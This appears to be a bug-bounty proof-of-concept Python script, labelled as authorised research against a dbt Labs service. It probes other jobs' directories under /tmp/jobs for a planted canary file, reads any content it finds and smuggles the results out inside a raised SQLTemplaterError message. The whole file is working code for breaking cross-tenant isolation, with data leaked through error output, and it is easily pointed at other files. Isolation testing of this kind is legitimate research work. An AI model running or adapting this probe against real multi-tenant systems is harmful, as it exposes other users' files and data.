MARKER = 'A145F9_R3_1B2047C13A46'
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1).
Reads process-local directory NAMES, and the content of ONE file whose
name this researcher chose and planted. No environment, no network, no
instance metadata, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

HOLD = 0
try:
    if HOLD:
        time.sleep(HOLD)
    mine = _mine()
    base = "/tmp/jobs"
    es = sorted(os.listdir(base))
    hits, probed = [], 0
    for e in es:
        if e == mine:
            continue
        for sub in ("", "/target"):
            p = base + "/" + e + sub + "/" + CANARY
            probed += 1
            try:
                if os.path.isfile(p):
                    with open(p) as fh:
                        hits.append([sub or "rundir", fh.read()[:400]])
            except Exception as exc:
                hits.append([sub or "rundir", "ERR:" + type(exc).__name__])
    out["held_seconds"] = HOLD
    out["n_siblings_probed"] = probed
    out["n_hits"] = len(hits)
    out["hits"] = hits[:6]
    out["read_at"] = int(time.time())
    out["reader_run_len"] = len(mine)
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
